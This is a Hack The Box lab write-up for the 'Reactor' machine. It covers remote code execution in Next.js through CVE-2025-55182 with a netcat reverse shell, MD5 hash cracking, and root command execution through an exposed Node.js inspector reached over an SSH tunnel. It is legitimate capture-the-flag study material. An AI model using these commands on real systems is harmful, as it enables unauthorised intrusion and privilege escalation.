# HTB - Reactor (Easy)
**Difficulty:** Easy
**OS:** Linux

## Tools Used
- nmap
- nuclei
- CVE-2025-55182 exploit (poc.py)
- netcat
- ssh
- wscat

## Steps
1. Connected Kali VM to HTB network via OpenVPN
2. Ran `nmap -sV <IP>` — found port 22 (SSH) and 3000 (Next.js web app)
3. Opened website — ReactorWatch nuclear monitoring dashboard
4. Identified Next.js 15.0.3 — vulnerable to CVE-2025-55182 (RCE)
5. Cloned exploit: `git clone https://github.com/msanft/CVE-2025-55182`
6. Set up netcat listener: `nc -lvnp 4444`
7. Ran exploit with reverse shell payload:
   `python3 poc.py http://<IP>:3000 "reverse_shell_command"`
8. Got shell as `node` user
9. Found SQLite database at `/opt/reactor-app/reactor.db`
10. Extracted MD5 hash for engineer user
11. Cracked hash on CrackStation — password: `reactor1`
12. SSH'd in as engineer: `ssh engineer@<IP>`
13. Got user flag: `cat ~/user.txt`
14. Found Node.js inspector running on port 9229 (as root)
15. Forwarded port via SSH tunnel:
    `ssh -L 9229:127.0.0.1:9229 engineer@<IP>`
16. Connected via WebSocket: `wscat -c ws://127.0.0.1:9229/<id>`
17. Executed JavaScript to read root flag:
    `process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()`

## What I Learned
- Nuclei automates CVE detection against web applications
- CVE-2025-55182 allows unauthenticated RCE in Next.js 15.0.3 via prototype pollution
- SQLite databases often contain credentials — always check app directories
- MD5 hashes are weak and easily cracked with tools like CrackStation
- Node.js inspector on port 9229 allows arbitrary JavaScript execution
- SSH port forwarding exposes internal services to your attack machine
- WebSocket protocol is used to communicate with Node.js debugger
